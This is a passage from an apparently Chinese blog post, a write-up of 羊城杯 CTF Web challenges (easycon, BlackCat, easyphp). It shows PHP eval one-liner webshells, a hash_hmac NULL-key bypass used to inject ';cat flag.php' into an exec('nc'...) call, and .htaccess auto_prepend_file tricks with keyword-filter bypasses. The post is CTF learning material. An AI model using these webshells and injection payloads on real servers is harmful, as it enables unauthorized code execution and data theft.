data-tag=字符串及正则表达式,函数,模块 data-author><span class=post-title title=Python学习-基础篇(三)>Python学习-基础篇(三)</span> <span class=post-date title="2020-01-19 18:16:50">2020/01/19</span></a> <a class="全部文章 编程开发 Python" href="/2020/01/18/Python学习-基础篇(二)/" data-tag=序列的应用,列表,元组,字典,集合 data-author><span class=post-title title=Python学习-基础篇(二)>Python学习-基础篇(二)</span> <span class=post-date title="2020-01-18 20:01:31">2020/01/18</span></a> <a class="全部文章 编程开发 Python" href="/2020/01/16/Python学习-基础篇(一)/" data-tag=开发工具,基本语法,流程控制 data-author><span class=post-title title=Python学习-基础篇(一)>Python学习-基础篇(一)</span> <span class=post-date title="2020-01-16 22:29:30">2020/01/16</span></a> <a class="全部文章 运维 Linux基础" href="/2020/01/07/Linux虚拟机常见使用及常见问题/" data-tag=Linux,问题整理 data-author><span class=post-title title=Linux虚拟机常见使用及常见问题>Linux虚拟机常见使用及常见问题</span> <span class=post-date title="2020-01-07 16:08:02">2020/01/07</span></a> <a class="全部文章 复习" href="/2019/12/26/Linux基础期末整理复习/" data-tag=Linux,期末复习 data-author><span class=post-title title=Linux基础期末整理复习>Linux基础期末整理复习</span> <span class=post-date title="2019-12-26 16:50:43">2019/12/26</span></a> <a class="全部文章 线下赛 AWD" href="/2019/12/16/AWD模式总结与2019河南高校网安联赛复现/" data-tag=河南高校网安联赛,复现 data-author><span class=post-title title=AWD模式总结与2019河南高校网安联赛复现>AWD模式总结与2019河南高校网安联赛复现</span> <span class=post-date title="2019-12-16 22:58:25">2019/12/16</span></a> <a class="全部文章 漏洞原理 XXE漏洞" href="/2019/12/02/从XML相关一步一步到XXE漏洞/" data-tag=XML,XML注入,Xpath注入,XXE漏洞 data-author><span class=post-title title=从XML相关一步一步到XXE漏洞>从XML相关一步一步到XXE漏洞</span> <span class=post-date title="2019-12-02 14:47:00">2019/12/02</span></a> <a class="全部文章 漏洞原理 SQL注入" href="/2019/11/16/sqli-labs攻关5(Sta)(Less-39_Less-53)/" data-tag="题目复现,靶场练习,堆叠注入,order by排序注入,异或注入" data-author><span class=post-title title=sqli-labs攻关5(Sta)(Less-39_Less-53)>sqli-labs攻关5(Sta)(Less-39_Less-53)</span> <span class=post-date title="2019-11-16 23:58:43">2019/11/16</span></a> <a class="全部文章 漏洞原理 SQL注入" href="/2019/11/12/sqli-labs攻关4(Adv)(Less-23_Less-38)/" data-tag=靶场练习,二次注入,过滤敏感关键字与WAF绕过,宽字节注入 data-author><span class=post-title title=sqli-labs攻关4(Adv)(Less-23_Less-38)>sqli-labs攻关4(Adv)(Less-23_Less-38)</span> <span class=post-date title="2019-11-12 23:02:46">2019/11/12</span></a> <a class="全部文章 漏洞原理 SQL注入" href="/2019/11/06/sqli-labs攻关3(Less-11-Less-22)/" data-tag=靶场练习,POST型联合查询注入,POST型报错注入,POST型盲注 data-author><span class=post-title title=sqli-labs攻关3(Less-11_Less-22)>sqli-labs攻关3(Less-11_Less-22)</span> <span class=post-date title="2019-11-06 23:55:21">2019/11/06</span></a> <a class="全部文章 漏洞原理 协议层漏洞" href="/2019/10/27/从一道题到HTTP请求走私/" data-tag=题目复现,HTTP,HTTP请求走私 data-author><span class=post-title title=从一道题到HTTP请求走私>从一道题到HTTP请求走私</span> <span class=post-date title="2019-10-27 23:13:44">2019/10/27</span></a> <a class="全部文章 漏洞原理 SQL注入" href="/2019/10/26/SQL盲注的简单分析/" data-tag=SQL盲注 data-author><span class=post-title title=SQL盲注的简单分析>SQL盲注的简单分析</span> <span class=post-date title="2019-10-26 21:50:20">2019/10/26</span></a> <a class="全部文章 漏洞原理 文件操作漏洞" href="/2019/10/19/任意文件读取与下载漏洞/" data-tag=题目复现,任意文件读取漏洞,任意文件下载漏洞 data-author><span class=post-title title=任意文件读取与下载漏洞>任意文件读取与下载漏洞</span> <span class=post-date title="2019-10-19 01:01:11">2019/10/19</span></a> <a class="全部文章 漏洞原理 SQL注入" href="/2019/09/25/SQL注入-报错注入/" data-tag=报错注入 data-author><span class=post-title title=SQL注入-报错注入>SQL注入-报错注入</span> <span class=post-date title="2019-09-25 00:21:26">2019/09/25</span></a> <a class="全部文章 CTF" href="/2019/09/05/攻防世界-Web(进阶区)/" data-tag=CTF,Web,攻防世界 data-author><span class=post-title title=攻防世界-Web(进阶区)>攻防世界-Web(进阶区)</span> <span class=post-date title="2019-09-05 23:46:17">2019/09/05</span></a> <a class="全部文章 CTF" href="/2019/09/02/i春秋-Web(一)/" data-tag=CTF,Web,i春秋 data-author><span class=post-title title=i春秋-Web(一)>i春秋-Web(一)</span> <span class=post-date title="2019-09-02 20:41:21">2019/09/02</span></a> <a class="全部文章 CTF" href="/2019/08/25/南邮-Web(二)/" data-tag=CTF,Web,南邮 data-author><span class=post-title title=南邮-Web(二)>南邮-Web(二)</span> <span class=post-date title="2019-08-25 18:31:58">2019/08/25</span></a> <a class="全部文章 漏洞原理 文件包含漏洞" href="/2019/08/21/文件包含漏洞/" data-tag=漏洞利用,漏洞基础,漏洞绕过,PHP伪协议 data-author><span class=post-title title=文件包含漏洞>文件包含漏洞</span> <span class=post-date title="2019-08-21 21:28:09">2019/08/21</span></a> <a class="全部文章 漏洞原理 信息泄露" href="/2019/08/15/常见Web源码泄露/" data-tag=源码泄露,源码泄露类型 data-author><span class=post-title title=常见Web源码泄露>常见Web源码泄露</span> <span class=post-date title="2019-08-15 20:03:10">2019/08/15</span></a> <a class="全部文章 漏洞原理 反序列化漏洞" href="/2019/08/14/PHP反序列化漏洞/" data-tag=PHP类与对象,序列化与反序列化基础,魔术方法简单利用 data-author><span class=post-title title=PHP反序列化漏洞>PHP反序列化漏洞</span> <span class=post-date title="2019-08-14 23:29:51">2019/08/14</span></a> <a class="全部文章 漏洞原理 命令注入" href="/2019/08/08/命令执行(Command Injection)与代码执行(Code execution)/" data-tag=命令执行,代码执行 data-author><span class=post-title title="命令执行(Command Injection)与代码执行(Code execution)">命令执行(Command Injection)与代码执行(Code execution)</span> <span class=post-date title="2019-08-08 23:11:51">2019/08/08</span></a> <a class="全部文章 CTF" href="/2019/08/06/Crypto-RSA加密/" data-tag=CTF,Crypto,RSA data-author><span class=post-title title=Crypto-RSA加密>Crypto-RSA加密</span> <span class=post-date title="2019-08-06 23:16:34">2019/08/06</span></a> <a class="全部文章 漏洞原理 文件上传漏洞" href="/2019/08/03/文件上传漏洞 学习笔记(二)/" data-tag=白名单绕过,内容绕过,竞争条件绕过 data-author><span class=post-title title="文件上传漏洞 学习笔记(二)">文件上传漏洞 学习笔记(二)</span> <span class=post-date title="2019-08-03 10:22:22">2019/08/03</span></a> <a class="全部文章 CTF" href="/2019/08/02/CTF做题总结(二)/" data-tag=Web,Reverse,SQL,盲注 data-author><span class=post-title title=CTF做题总结(二)>CTF做题总结(二)</span> <span class=post-date title="2019-08-02 11:22:58">2019/08/02</span></a> <a class="全部文章 漏洞原理 文件上传漏洞" href="/2019/07/31/文件上传漏洞 学习笔记(一)/" data-tag=JS绕过,MIME绕过,黑名单绕过 data-author><span class=post-title title="文件上传漏洞 学习笔记(一)">文件上传漏洞 学习笔记(一)</span> <span class=post-date title="2019-07-31 23:01:05">2019/07/31</span></a> <a class="全部文章 CTF" href="/2019/07/25/南邮-Web(一)/" data-tag=CTF,Web,南邮 data-author><span class=post-title title=南邮-Web(一)>南邮-Web(一)</span> <span class=post-date title="2019-07-25 20:05:46">2019/07/25</span></a> <a class="全部文章 CTF" href="/2019/07/21/Crypto-简单加密/" data-tag=CTF,Crypto,简单加密 data-author><span class=post-title title=Crypto-简单加密>Crypto-简单加密</span> <span class=post-date title="2019-07-21 21:30:41">2019/07/21</span></a> <a class="全部文章 漏洞原理 SQL注入" href="/2019/07/19/sqli-labs攻关2(Less-7_Less-10)/" data-tag=靶场练习,导出文件注入,GET型盲注 data-author><span class=post-title title=sqli-labs攻关2(Less-7_Less-10)>sqli-labs攻关2(Less-7_Less-10)</span> <span class=post-date title="2019-07-19 22:05:21">2019/07/19</span></a> <a class="全部文章 CTF" href="/2019/07/17/攻防世界-Web(新手区)/" data-tag=CTF,Web,攻防世界 data-author><span class=post-title title=攻防世界-Web(新手区)>攻防世界-Web(新手区)</span> <span class=post-date title="2019-07-17 21:22:27">2019/07/17</span></a> <a class="全部文章 CTF" href="/2019/07/15/安恒月赛7月-MISC wp/" data-tag=CTF,MISC,安恒 data-author><span class=post-title title="安恒月赛7月-MISC wp">安恒月赛7月-MISC wp</span> <span class=post-date title="2019-07-15 19:33:17">2019/07/15</span></a> <a class="全部文章 漏洞原理 XSS" href="/2019/07/14/XSS漏洞攻关(二)/" data-tag=XSS绕过 data-author><span class=post-title title=XSS漏洞攻关(二)>XSS漏洞攻关(二)</span> <span class=post-date title="2019-07-14 19:01:42">2019/07/14</span></a> <a class="全部文章 CTF" href="/2019/07/12/Crypto-位移编码/" data-tag=CTF,Crypto,移位编码 data-author><span class=post-title title=Crypto-位移编码>Crypto-位移编码</span> <span class=post-date title="2019-07-12 21:32:41">2019/07/12</span></a> <a class="全部文章 CTF" href="/2019/07/10/MISC-图片隐写/" data-tag=CTF,MISC,隐写 data-author><span class=post-title title=MISC-图片隐写>MISC-图片隐写</span> <span class=post-date title="2019-07-10 21:05:43">2019/07/10</span></a> <a class="全部文章 线下赛 AWD" href="/2019/06/24/ISCC2019线下赛总结/" data-tag=ISCC,感悟 data-author><span class=post-title title=ISCC2019线下赛总结>ISCC2019线下赛总结</span> <span class=post-date title="2019-06-24 00:07:01">2019/06/24</span></a> <a class="全部文章 线下赛 AWD" href="/2019/06/19/CTF线下赛AWD攻防准备/" data-tag=准备 data-author><span class=post-title title=CTF线下赛AWD攻防准备>CTF线下赛AWD攻防准备</span> <span class=post-date title="2019-06-19 19:45:58">2019/06/19</span></a> <a class="全部文章 CTF" href="/2019/06/18/BUGKU做题总结(一)/" data-tag=CTF,MISC,BUGKU data-author><span class=post-title title=BUGKU做题总结(一)>BUGKU做题总结(一)</span> <span class=post-date title="2019-06-18 21:11:11">2019/06/18</span></a> <a class="全部文章 漏洞原理 SQL注入" href="/2019/06/10/sqli-labs攻关1(Less-1_Less-6)/" data-tag=GET型联合查询注入,GET型双查询注入,靶场练习 data-author><span class=post-title title=sqli-labs攻关1(Less-1_Less-6)>sqli-labs攻关1(Less-1_Less-6)</span> <span class=post-date title="2019-06-10 19:03:52">2019/06/10</span></a> <a class="全部文章 编程开发 PHP" href="/2019/06/05/Web开发-简单BBS论坛/" data-tag=Web开发,bbs论坛 data-author><span class=post-title title=Web开发-简单BBS论坛>Web开发-简单BBS论坛</span> <span class=post-date title="2019-06-05 17:32:32">2019/06/05</span></a> <a class="全部文章 协议分析 HTTP协议" href="/2019/05/29/HTTP协议基础/" data-tag=HTTP协议,HTTP头流量包 data-author><span class=post-title title=HTTP协议基础>HTTP协议基础</span> <span class=post-date title="2019-05-29 20:39:42">2019/05/29</span></a> <a class="全部文章 CTF" href="/2019/05/27/ISCC-MISC做题总结/" data-tag=CTF,MISC,ISCC data-author><span class=post-title title=ISCC-MISC做题总结>ISCC-MISC做题总结</span> <span class=post-date title="2019-05-27 18:53:14">2019/05/27</span></a> <a class="全部文章 编程开发 PHP" href="/2019/05/04/Web开发-PHP基础篇(四)/" data-tag=MySQL学习,PHP与MySQL交互 data-author><span class=post-title title=Web开发-PHP基础篇(四)>Web开发-PHP基础篇(四)</span> <span class=post-date title="2019-05-04 15:18:37">2019/05/04</span></a> <a class="全部文章 漏洞原理 XSS" href="/2019/04/28/XSS漏洞攻关(一)/" data-tag=XSS基础,XSS绕过 data-author><span class=post-title title=XSS漏洞攻关(一)>XSS漏洞攻关(一)</span> <span class=post-date title="2019-04-28 17:00:44">2019/04/28</span></a> <a class="全部文章 编程开发 PHP" href="/2019/04/27/Web开发-PHP基础篇(三)/" data-tag=正则表达式,日期和时间,图像处理,文件与目录操作,会话控制 data-author><span class=post-title title=Web开发-PHP基础篇(三)>Web开发-PHP基础篇(三)</span> <span class=post-date title="2019-04-27 15:02:06">2019/04/27</span></a> <a class="全部文章 线下赛 团队内部" href="/2019/04/26/一次团队内部比赛经历/" data-tag=BUG,SQL注入,PHP data-author><span class=post-title title=一次团队内部比赛经历>一次团队内部比赛经历</span> <span class=post-date title="2019-04-26 22:59:01">2019/04/26</span></a> <a class="全部文章 编程开发 PHP" href="/2019/04/26/php mysql html css制作带Cookie登陆页面/" data-tag=Web开发,登录和注册功能 data-author><span class=post-title title="php mysql html css制作带Cookie登陆页面">php mysql html css制作带Cookie登陆页面</span> <span class=post-date title="2019-04-26 10:08:26">2019/04/26</span></a> <a class="全部文章 CTF" href="/2019/04/16/CTF做题总结(一)/" data-tag=CTF,MISC,Crypto data-author><span class=post-title title=CTF做题总结(一)>CTF做题总结(一)</span> <span class=post-date title="2019-04-16 11:27:05">2019/04/16</span></a> <a class="全部文章 编程开发 PHP" href="/2019/04/15/Web开发-PHP基础篇(一~二)/" data-tag=基本语法,流程控制,函数,数组,字符串 data-author><span class=post-title title=Web开发-PHP基础篇(一-二)>Web开发-PHP基础篇(一-二)</span> <span class=post-date title="2019-04-15 20:22:18">2019/04/15</span></a> <a class="全部文章 CTF" href="/2019/04/06/MISC-隐写的总结/" data-tag=CTF,MISC,隐写 data-author><span class=post-title title=MISC-隐写的总结>MISC-隐写的总结</span> <span class=post-date title="2019-04-06 18:33:32">2019/04/06</span></a> <a class="全部文章 CTF" href="/2019/04/06/MISC-zip压缩包的总结/" data-tag=CTF,MISC,ZIP data-author><span class=post-title title=MISC-zip压缩包的总结>MISC-zip压缩包的总结</span> <span class=post-date title="2019-04-06 00:21:56">2019/04/06</span></a> <a class="全部文章 编程开发 前端" href="/2019/03/30/Web前端-CSS篇/" data-tag=Web前端,CSS data-author><span class=post-title title=Web前端-CSS篇>Web前端-CSS篇</span> <span class=post-date title="2019-03-30 19:39:32">2019/03/30</span></a> <a class="全部文章 编程开发 前端" href="/2019/03/25/Web前端-HTML篇/" data-tag=Web前端,HTML data-author><span class=post-title title=Web前端-HTML篇>Web前端-HTML篇</span> <span class=post-date title="2019-03-25 22:54:31">2019/03/25</span></a> <a class="全部文章 博客" href="/2019/03/17/Github-Hexo的搭建/" data-tag=Hexo,Github,Hexo搭建 data-author><span class=post-title title=Github-Hexo简单搭建>Github-Hexo简单搭建</span> <span class=post-date title="2019-03-17 12:36:45">2019/03/17</span></a> <a class="全部文章 编程开发 前端" href="/2019/03/15/html基础篇一/" data-tag=Web前端,HTML data-author><span class=post-title title=超文本标记语言html>超文本标记语言html</span> <span class=post-date title="2019-03-15 23:43:10">2019/03/15</span></a> <a class="全部文章 工具学习 phpstudy" href="/2019/03/15/phpstudy-MySQL基础篇一/" data-tag=Web,数据库 data-author><span class=post-title title=phpstudy-MySQL的简单使用以及cmd打开MySQL>phpstudy-MySQL的简单使用以及cmd打开MySQL</span> <span class=post-date title="2019-03-15 23:39:20">2019/03/15</span></a> <a class="全部文章 First" href="/2019/03/12/hello-world/" data-tag data-author><span class=post-title title="Hello world">Hello world</span> <span class=post-date title="2019-03-12 22:33:11">2019/03/12</span></a><div id=no-item-tips></div></nav><div id=outline-list></div></div></div><div class=hide-list><div class=semicircle data-title="切换全屏 快捷键 s"><div class="brackets first"><</div><div class=brackets>&gt;</div></div></div></aside><div id=post><div class=pjax><article id=post-羊城杯Web题总结与复现 class="article article-type-post" itemscope itemprop=blogPost><h1 class=article-title>羊城杯Web题总结与复现</h1><div class=article-meta><span class=book><i class="iconfont icon-category"></i> <a data-rel=CTF>CTF</a></span> <span class=tag><i class="iconfont icon-tag"></i> <a class=color4>CTF</a> <a class=color4>Web</a> <a class=color4>羊城杯</a></span></div><div class=article-meta>发布时间 :<time class=date title="最后更新: 2020-09-14 23:52:25">2020-09-11 21:03</time></div><div class=article-meta><span>字数:2.7k</span> <span id=busuanzi_container_page_pv>阅读 :<span id=busuanzi_value_page_pv><span class=count-comment><span class=spinner><div class=cube1></div><div class=cube2></div></span></span></span></span></div><div class=toc-ref><ol class=toc><li class="toc-item toc-level-2"><a class=toc-link href=#0x00-前言><span class=toc-text>0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class=toc-link href=#0x01-easycon><span class=toc-text>0x01 easycon</span></a></li><li class="toc-item toc-level-2"><a class=toc-link href=#0x02-BlackCat><span class=toc-text>0x02 BlackCat</span></a></li><li class="toc-item toc-level-2"><a class=toc-link href=#0x03-easyphp><span class=toc-text>0x03 easyphp</span></a><ol class=toc-child><li class="toc-item toc-level-3"><a class=toc-link href=#解题思路><span class=toc-text>解题思路</span></a></li><li class="toc-item toc-level-3"><a class=toc-link href=#第一种解题方法：直接写入一句话木马><span class=toc-text>第一种解题方法：直接写入一句话木马</span></a></li><li class="toc-item toc-level-3"><a class=toc-link href=#第二种解题方法：利用-htaccess设置文件自动包含><span class=toc-text>第二种解题方法：利用.htaccess设置文件自动包含</span></a><ol class=toc-child><li class="toc-item toc-level-4"><a class=toc-link href=#htaccess设置php环境变量的格式><span class=toc-text>.htaccess设置php环境变量的格式</span></a></li><li class="toc-item toc-level-4"><a class=toc-link href=#auto-prepend-file与auto-append-file><span class=toc-text>auto_prepend_file与auto_append_file</span></a></li><li class="toc-item toc-level-4"><a class=toc-link href=#绕过过滤><span class=toc-text>绕过过滤</span></a><ol class=toc-child><li class="toc-item toc-level-5"><a class=toc-link href=#1、绕过-n的过滤><span class=toc-text>1、绕过\n的过滤</span></a></li><li class="toc-item toc-level-5"><a class=toc-link href=#2、绕过stristr的过滤><span class=toc-text>2、绕过stristr的过滤</span></a><ol class=toc-child><li class="toc-item toc-level-6"><a class=toc-link href=#1-方法一：使用base64加密绕过stristr函数><span class=toc-text>1.方法一：使用base64加密绕过stristr函数</span></a></li><li class="toc-item toc-level-6"><a class=toc-link href=#2-方法二：对过滤的关键字中间添加换行-n绕过stristr函数><span class=toc-text>2.方法二：对过滤的关键字中间添加换行\n绕过stristr函数</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class=toc-link href=#0x04-后记><span class=toc-text>0x04 后记</span></a></li></ol><style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-5 i,
+    .toc-level-5 ol {
+        display: none !important;
+    }
+</style></div><div class=article-entry itemprop=articleBody><h2 id=0x00-前言><a href=#0x00-前言 class=headerlink title="0x00 前言"></a>0x00 前言</h2><p>总结一下羊城杯的Web题，就做出几道。发现有的题是原题改的，不过涉及到一些没有学过的知识，简单总结一下。</p><h2 id=0x01-easycon><a href=#0x01-easycon class=headerlink title="0x01 easycon"></a>0x01 easycon</h2><p><strong>考点：一句话木马+base64转图片</strong><br>打开题目，发现是Apache默认页，使用扫描工具扫描一下<br><img src=http://img-blog.csdnimg.cn/20200910220054129.png alt=在这里插入图片描述><br>发现<code>index.php</code>，访问发现弹窗<code>eval post cmd</code>，意思很明显，就是post传入cmd参数，并且应该使用了eval()函数。所以，源码里应该有<code>&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;</code>，一句话木马，蚁剑直接连<br><img src="http://img-blog.csdnimg.cn/20200910220812922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt=在这里插入图片描述><br>发现上图所示的这些文件，发现<code>bbbbbbbbb.txt</code>里边的文件内容很多，并且像base64编码。<br><img src=http://img-blog.csdnimg.cn/20200910221317848.png alt=在这里插入图片描述><br>同时看到开头的<code>/9j/</code>，根据经验是base64编码转图片，并且头部缺少内容<code>data:image/jpg;base64,</code><br>找一个base64在线转图片的网站，加上缺少的内容，进行转换，得到带有flag的图片<br><img src="http://img-blog.csdnimg.cn/20200910221846863.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt=在这里插入图片描述></p><h2 id=0x02-BlackCat><a href=#0x02-BlackCat class=headerlink title="0x02 BlackCat"></a>0x02 BlackCat</h2><p><strong>考点：文件分析+代码审计+弱类型+hash</strong><br>查看源代码，发现注释<code>&lt;!--都说听听歌了！--&gt;</code>。于是下载引用的音频文件<code>Hei_Mao_Jing_Chang.mp3</code>，使用winhex打开，在最后边发现<br><img src=http://img-blog.csdnimg.cn/20200910222926109.png alt=在这里插入图片描述><br>复制出来，得到源码：</p><pre><code class=php>//post传入Black-Cat-Sheriff和One-ear绕过判断
+if(empty($_POST[&#39;Black-Cat-Sheriff&#39;]) || empty($_POST[&#39;One-ear&#39;])){
+    die(&#39;谁！竟敢踩我一只耳的尾巴！&#39;);
+}
+
+$clandestine = getenv(&quot;clandestine&quot;);   //获取一个环境变量的值
+if(isset($_POST[&#39;White-cat-monitor&#39;]))
+    $clandestine = hash_hmac(&#39;sha256&#39;, $_POST[&#39;White-cat-monitor&#39;], $clandestine); //使用 HMAC 方法生成带有密钥的哈希值
+//PHP的类型自动转换，控制的变量只有One-ear和White-cat-monitor
+$hh = hash_hmac(&#39;sha256&#39;, $_POST[&#39;One-ear&#39;], $clandestine);
+if($hh !== $_POST[&#39;Black-Cat-Sheriff&#39;]){
+    die(&#39;有意瞄准，无意击发，你的梦想就是你要瞄准的目标。相信自己，你就是那颗射中靶心的子弹。&#39;);
+}
+
+echo exec(&quot;nc&quot;.$_POST[&#39;One-ear&#39;]);</code></pre><p>代码的大概意思：</p><blockquote><p>POST传入Black-Cat-Sheriff和One-ear，绕过第一个判断<br>POST传入White-cat-monitor，绕过第二个判断，且传入的是数组使<code>$clandestine</code>为NULL，即将下一个加密的密钥置空<br>POST传入的Black-Cat-Sheriff与加密后的One-ear相同，绕过第三个判断<br>最终执行<code>echo exec(&quot;nc&quot;.$_POST[&#39;One-ear&#39;]);</code>表示成功</p></blockquote><p>测试一下下面这两条语句：<br><strong>语句1</strong>：</p><pre><code class=php>php &gt; var_dump(hash_hmac(&#39;sha256&#39;,array(1),&#39;123&#39;));
+PHP Warning:  hash_hmac() expects parameter 2 to be string, array given in php shell code on line 1
+NULL</code></pre><p><img src=http://img-blog.csdnimg.cn/20200911001536160.png alt=在这里插入图片描述><br>post传入White-cat-monitor为数组，对White-cat-monitor加密后使得<code>$clandestine</code>为NULL<br><strong>语句2</strong>：</p><pre><code class=php>php &gt; var_dump(hash_hmac(&#39;sha256&#39;,&#39;;id&#39;,NULL));
+string(64) &quot;58dedd736c5af324a198c6c663e569df59691854d1f53d704bdbce40f1d139c1&quot;</code></pre><p>对post传入的One-ear进行加密，生成hash值。<br>审计完代码后，开始做题：<br>1、POST传入Black-Cat-Sheriff和One-ear，使Black-Cat-Sheriff与加密后的One-ear相同<br>One-ear的值为：<code>;cat flag.php</code> (通过目录扫描扫到flag.php文件)<br>Black-Cat-Sheriff的值为：One-ear加密后的值，即：</p><pre><code class=php>php &gt; var_dump(hash_hmac(&#39;sha256&#39;,&#39;;cat flag.php&#39;,NULL));
+string(64) &quot;04b13fc0dff07413856e54695eb6a763878cd1934c503784fe6e24b7e8cdb1b6&quot;
+
+Black-Cat-Sheriff的值为：
+04b13fc0dff07413856e54695eb6a763878cd1934c503784fe6e24b7e8cdb1b6</code></pre><p>2、POST传入White-cat-monitor数组(即<code>White-cat-monitor[]=1</code>)使$clandestine为NULL<br>最终得到的payload为：</p><pre><code class=php>Black-Cat-Sheriff=04b13fc0dff07413856e54695eb6a763878cd1934c503784fe6e24b7e8cdb1b6&amp;One-ear=;cat flag.php&amp;White-cat-monitor[]=1</code></pre><p>post传入得到flag<br><img src="http://img-blog.csdnimg.cn/20200911003722996.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt=在这里插入图片描述></p><h2 id=0x03-easyphp><a href=#0x03-easyphp class=headerlink title="0x03 easyphp"></a>0x03 easyphp</h2><p><strong>考点：.htaccess解析+命令注入+相关绕过</strong><br>打开题目，发现源码：</p><pre><code class=php> &lt;?php
+    $files = scandir(&#39;./&#39;); 
+    foreach($files as $file) {
+        if(is_file($file)){
+            if ($file !== &quot;index.php&quot;) {
+                unlink($file);
+            }
+        }
+    }
+    if(!isset($_GET[&#39;content&#39;]) || !isset($_GET[&#39;filename&#39;])) {
+        highlight_file(__FILE__);
+        die();
+    }
+    $content = $_GET[&#39;content&#39;];
+    if(stristr($content,&#39;on&#39;) || stristr($content,&#39;html&#39;) || stristr($content,&#39;type&#39;) || stristr($content,&#39;flag&#39;) || stristr($content,&#39;upload&#39;) || stristr($content,&#39;file&#39;)) {
+        echo &quot;Hacker&quot;;
+        die();
+    }
+    $filename = $_GET[&#39;filename&#39;];
+    if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1) {
+        echo &quot;Hacker&quot;;
+        die();
+    }
+    $files = scandir(&#39;./&#39;); 
+    foreach($files as $file) {
+        if(is_file($file)){
+            if ($file !== &quot;index.php&quot;) {
+                unlink($file);
+            }
+        }
+    }
+    file_put_contents($filename, $content . &quot;\nHello, world&quot;);
+?&gt; </code></pre><p>发现是<a href="https://www.bdwms.com/?p=525" target=_blank rel=noopener>2019XNUCA的easyphp</a>原题改的，不过少了<code>include_once(&quot;fl3g.php&quot;);</code>，其他关键部分基本没变。所以可以参考解题。<br>题目的大致意思：</p><blockquote><p>1、通过file_put_contents函数来写马<br>2、对我们可以控制的参数<code>$filename</code>和<code>$content</code>分别进行了preg_match函数和stristr函数的过滤，<br>preg_match的过滤要求是输入的文件名必须只能带有<code>[a-z\.]</code>范围的字符<br>stristr函数则是过滤了on，html，type，flag，upload和file关键字<br>3、本题环境只对index.php文件进行解析。并且开头和末尾都对当前目录下的文件进行检查，删除(unlink)除了index.php外的所有文件</p></blockquote><h3 id=解题思路><a href=#解题思路 class=headerlink title=解题思路></a>解题思路</h3><p>根据题目的意思<code>只解析index.php</code>，想到以下方法：<br>1、写入一句话木马到index.php<br>2、写入一个<code>.htaccess</code>让当前目录下的所有文件都能解析为php文件<br>3、写入一个<code>.user.ini</code>让index.php自动包含上我们写入的马</p><blockquote><p>第一种方法是最简单的，直接写入一句话木马<?php eval($_POST['qwzf']); ?>到index.php即可<br>第二种方法，一定需要写多次，前面写的.htaccess会被删掉；而如果是写上开头自动包含，并且包含的文件就是.user.ini，并且在.user.ini中直接写入马，那么理论上index.php在删除前就可以执行到我们写入的马。<br>第三种方法，利用<code>.user.ini</code>设置文件自动包含。这里尝试一下，没有成功。</p></blockquote><h3 id=第一种解题方法：直接写入一句话木马><a href=#第一种解题方法：直接写入一句话木马 class=headerlink title=第一种解题方法：直接写入一句话木马></a>第一种解题方法：直接写入一句话木马</h3><p>直接写入一句话木马到index.php</p><pre><code class=php>?filename=index.php&amp;content=&lt;?php eval($_POST[&#39;qwzf&#39;]); ?&gt;</code></pre><p>蚁剑连接，找到flag即可。</p><h3 id=第二种解题方法：利用-htaccess设置文件自动包含><a href=#第二种解题方法：利用-htaccess设置文件自动包含 class=headerlink title=第二种解题方法：利用.htaccess设置文件自动包含></a>第二种解题方法：利用<code>.htaccess</code>设置文件自动包含</h3><h4 id=htaccess设置php环境变量的格式><a href=#htaccess设置php环境变量的格式 class=headerlink title=.htaccess设置php环境变量的格式></a><code>.htaccess</code>设置php环境变量的格式</h4><p><code>.htaccess</code>也可以设置开头自动包含，<code>.htaccess</code>设置php环境变量的格式：</p><pre><code class=bash>#format
+php_value setting_name setting_value
+#example
+php_value auto_prepend_file .htaccess</code></pre><h4 id=auto-prepend-file与auto-append-file><a href=#auto-prepend-file与auto-append-file class=headerlink title=auto_prepend_file与auto_append_file></a>auto_prepend_file与auto_append_file</h4><p>使用auto_prepend_file与auto_append_file在所有页面的顶部与底部require文件。<br><code>php.ini</code>中有两项</p><pre><code class=bash>auto_prepend_file #在页面顶部加载文件
+auto_append_file  #在页面底部加载文件</code></pre><p>使用这种方法可以不需要改动任何页面，当需要修改顶部或底部require文件时，只需要修改auto_prepend_file与auto_append_file的值即可。</p><h4 id=绕过过滤><a href=#绕过过滤 class=headerlink title=绕过过滤></a>绕过过滤</h4><h5 id=1、绕过-n的过滤><a href=#1、绕过-n的过滤 class=headerlink title=1、绕过\n的过滤></a>1、绕过<code>\n</code>的过滤</h5><p>于是确定我们要写入的文件<code>.htaccess</code>，文件内容为：</p><pre><code class=bash>php_value auto_prepend_file .htaccess
+#&lt;?php phpinfo();?&gt;\</code></pre><blockquote><p>末尾有个符号<code>\</code>是必须写入的，我们注意到源代码中file_put_contents中的文件内容传入的变量<code>$content</code>末尾还连接上了<code>\nHello, world</code>这个字符串，而<code>\n</code>代表着换行，而我们再一个<code>\</code>，则会拼接成<code>\\n</code>，即转义掉了n前面的<code>\</code>，构不成换行。换句话来说，如果我们没有加入<code>\</code>，那么写入<code>.htaccess</code>的文件内容就为：</p></blockquote><pre><code class=bash>php_value auto_prepend_file .htaccess
+#&lt;?php phpinfo();?&gt;
+Hello, world</code></pre><blockquote><p>会出现末尾行的字符串不符合htaccess文件的语法标准而报错导致htaccess文件无法执行，那么当前目录下的所有文件就会面临崩溃，所以说，末尾必须写入<code>\</code></p></blockquote><h5 id=2、绕过stristr的过滤><a href=#2、绕过stristr的过滤 class=headerlink title=2、绕过stristr的过滤></a>2、绕过stristr的过滤</h5><p>上边写入文件<code>.htaccess</code>的内容里包含了<code>file关键字</code>，被<code>stristr</code>过滤，所以要绕过<code>stristr</code>的过滤</p><pre><code class=php>if(stristr($content,&#39;on&#39;) || stristr($content,&#39;html&#39;) || stristr($content,&#39;type&#39;) || stristr($content,&#39;flag&#39;) || stristr($content,&#39;upload&#39;) || stristr($content,&#39;file&#39;)) {
+        echo &quot;Hacker&quot;;
+        die();
